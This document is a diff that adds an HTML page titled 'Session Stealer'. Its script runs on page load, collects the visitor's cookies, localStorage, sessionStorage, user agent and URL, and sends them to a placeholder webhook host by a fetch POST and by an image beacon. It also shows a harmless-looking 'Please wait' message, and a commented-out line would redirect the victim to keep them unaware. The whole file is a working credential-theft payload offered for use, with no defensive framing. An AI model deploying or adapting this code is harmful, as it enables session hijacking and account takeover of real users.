@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Session Stealer</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <script>
+        // Webhook URL (replace with your actual webhook endpoint)
+        const webhookURL = "https://your-webhook.site/your-endpoint";
+        
+        // Steal cookies
+        const stolenCookies = document.cookie;
+        
+        // Get additional session info
+        const sessionData = {
+            cookies: stolenCookies,
+            userAgent: navigator.userAgent,
+            url: window.location.href,
+            timestamp: new Date().toISOString(),
+            localStorage: JSON.stringify(localStorage),
+            sessionStorage: JSON.stringify(sessionStorage)
+        };
+        
+        // Send via fetch
+        fetch(webhookURL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(sessionData)
+        });
+        
+        // Alternative: image beacon for GET requests
+        new Image().src = webhookURL + "?cookie=" + encodeURIComponent(stolenCookies) + 
+                          "&ua=" + encodeURIComponent(navigator.userAgent);
+        
+        // Optional: redirect to keep victim unaware
+        // window.location.href = "https://original-site.com";
+        
+        // Display nothing suspicious
+        document.body.innerHTML = "<h1>Please wait...</h1>";
+    </script>
+</body>
+</html>
